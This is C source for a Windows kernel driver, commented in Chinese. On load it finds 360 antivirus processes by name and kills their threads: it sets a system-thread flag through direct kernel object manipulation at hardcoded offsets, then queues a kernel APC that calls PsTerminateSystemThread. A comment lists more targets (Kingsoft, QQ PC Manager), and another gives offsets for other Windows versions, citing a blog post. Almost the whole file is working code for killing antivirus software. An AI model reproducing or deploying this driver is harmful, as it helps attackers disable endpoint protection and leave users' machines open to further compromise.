#include <ntddk.h>
typedef VOID (*MyPspExitThread)(NTSTATUS status);
MyPspExitThread PspExitThread;
NTSTATUS
	PsLookupProcessByProcessId(
	IN HANDLE ProcessId,
	OUT PEPROCESS *Process
	);

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTSTATUS
	PsLookupThreadByThreadId(
	IN HANDLE ThreadId,
	OUT PETHREAD *Thread
	);
PEPROCESS
	IoThreadToProcess(
	IN PETHREAD  Thread
	); 

VOID KeInitializeApc (
	PKAPC Apc,
	PETHREAD Thread,
	KAPC_ENVIRONMENT Environment,
	PKKERNEL_ROUTINE KernelRoutine,
	PKRUNDOWN_ROUTINE RundownRoutine,
	PKNORMAL_ROUTINE NormalRoutine,
	KPROCESSOR_MODE ProcessorMode,
	PVOID NormalContext
	);

BOOLEAN KeInsertQueueApc(PKAPC Apc,PVOID SystemArg1,PVOID SystemArg2,KPRIORITY Increment);
VOID APCRT(PKAPC Apc,PKNORMAL_ROUTINE*NormalRoutine,PVOID  *NormalContext,PVOID *SystemArgument1,PVOID *SystemArgument2)
{
	ExFreePool(Apc);
	//PspExitThread = (MyPspExitThread)0x805d3086;
	//PspExitThread(STATUS_SUCCESS);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

BOOLEAN My_PspTerminateProcess(PEPROCESS Process)
{
	ULONG i;
	PETHREAD txtd;
	PEPROCESS txps;
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	for (i=8;i<=65536;i+=4)
	{
		st = PsLookupThreadByThreadId(i,&txtd);
		if ( NT_SUCCESS(st) )
		{
			txps=IoThreadToProcess(txtd);
			if ( txps == Process )
			{
				MyPspTerminatePsByPointer(txtd);
			}
		}
	}
	return TRUE;
}

NTSTATUS MyPspTerminatePsByPointer(PETHREAD Thread)
{
	//系统线程常量标志
	ULONG Systerm_Thread_Sign= 0x10;
	ULONG Size = 0;
	ULONG i = 0;
	PKAPC pApc = 0;

	if ( MmIsAddressValid((PVOID)Thread))//首先要校验地址,有效的话就DKOM
	{
		*(PULONG)((ULONG)Thread + 0x248) =Systerm_Thread_Sign;

		pApc = ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),'apc');

		if (pApc)
		{
			//apcrt 是apc例程
			KeInitializeApc(pApc,Thread,OriginalApcEnvironment,APCRT,0,0,KernelMode,0);
			KeInsertQueueApc(pApc,pApc,0,2);
		}
	}
	return STATUS_SUCCESS;
}

PEPROCESS SearchProcessByName(const char* ProcessName)
{
	ULONG i = 0;
	PEPROCESS hProcess;
	for(i=0;i<65535;i+=4)
	{
		if(PsLookupProcessByProcessId((HANDLE)i,&hProcess)==STATUS_SUCCESS)
		{
			if (strcmp(ProcessName,(char*)((ULONG)hProcess+0x174)) == 0)
			{
				return hProcess;
			}
		}
	}
	return NULL;
}

void DriverUnload(PDRIVER_OBJECT driver)
{
	DbgPrint("驱动停止运行!\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	PEPROCESS hProcess1;
	PEPROCESS hProcess2;
	PEPROCESS hProcess3;
	PEPROCESS hProcess4;
	PEPROCESS hProcess5;

	hProcess1 = SearchProcessByName("ZhuDongFangYu.e");
	if(hProcess1 != NULL)
	{
		//DbgPrint("找到并开始结束主动防御\n");
		My_PspTerminateProcess(hProcess1);
		//DbgPrint("主动防御结束\n");
	}
	hProcess2 = SearchProcessByName("360Tray.exe");
	if(hProcess2 != NULL)
	{
		//DbgPrint("找到并开始结束360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess2);
		//DbgPrint("结束360Tray\n");
	}
	hProcess3 = SearchProcessByName("360speedld.exe");
	if(hProcess3 != NULL)
	{
		//DbgPrint("找到并开始结束360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess3);
		//DbgPrint("结束360Tray\n");
	}
	hProcess4 = SearchProcessByName("360Safe.exe");
	if(hProcess4 != NULL)
	{
		//DbgPrint("找到并开始结束360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess4);
		//DbgPrint("结束360Tray\n");
	}
	hProcess5 = SearchProcessByName("LiveUpdate360.e");
	if(hProcess5 != NULL)
	{
		//DbgPrint("找到并开始结束360Tray\n");
		//DbgPrint("%x\n",hProcess2);
		My_PspTerminateProcess(hProcess5);
		//DbgPrint("结束360Tray\n");
	}
	driver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
	/*
	*****360进程*****
	ZhuDongFangYu.e
	360Tray.exe
	360speedld.exe
	360Safe.exe
	LiveUpdate360.e
	*****金山进程*****
	kscan.exe
	kxetray.exe
	kxescore.exe
	*****QQ电脑管家进程*****
	QQPCRTP.exe
	QQPCRealTimeSpe
	QMDL.exe
	QQPCTray.exe
	*/
}

/*
https://blog.csdn.net/py_panyu/article/details/45012289
2.调用APC来结束进程.其实这个方法本质上来讲和第一种是一样的.因为第一种方法就是通过PspTerminateProcess ->PspTerminateThreadByPointer ->KeInitializeApc/KeInsertQueueApc来结束进程的.但是不同的是第一种方法用PspTerminateProcess通过PEPROCESS的hreadListHead链表来获取所有线程,然后PspTerminateThreadByPointer一个个的把线程干掉.我这里从新修改了它,不用PsGetNextProcessThread来遍历线程.而是用一个我认为足够大的数字来枚举并结束线程
过程为PsLookupThreadByThreadId传入线程ID获取线程结构指针，再通过IoThreadToProcess传入线程指针结构，返回线程所属的进程指针，然后对比确定该线程属于目标进程后，调用PspTerminateThreadBypointer传入该线程结构指针，干掉它
*/

/*
为什么要把线程标志修改为系统线程呢？因为我们需要使用导出的PsTerminateSystemThread。这个东西很奇怪，不仅只能结束系统线程，而且只对当前进程线程有效，它唯一的参数就是ExitStatus。所以我们要使用这个函数，只能欺骗我们要结束的线程是系统线程。特别的，只能在内核APC例程里使用，否则无效或者是把自己的线程给结束了（如果执行此函数的线程是系统线程）。由于CrossThreadFlags偏移是硬编码，所以我们只能根据系统使用硬编码，
WindowsXP的硬编码是0x248，Windows2003的硬编码是0x240，WindowsVISTA和Windows2008的硬编码是0x260，Windows7的硬编码是0x280.
*/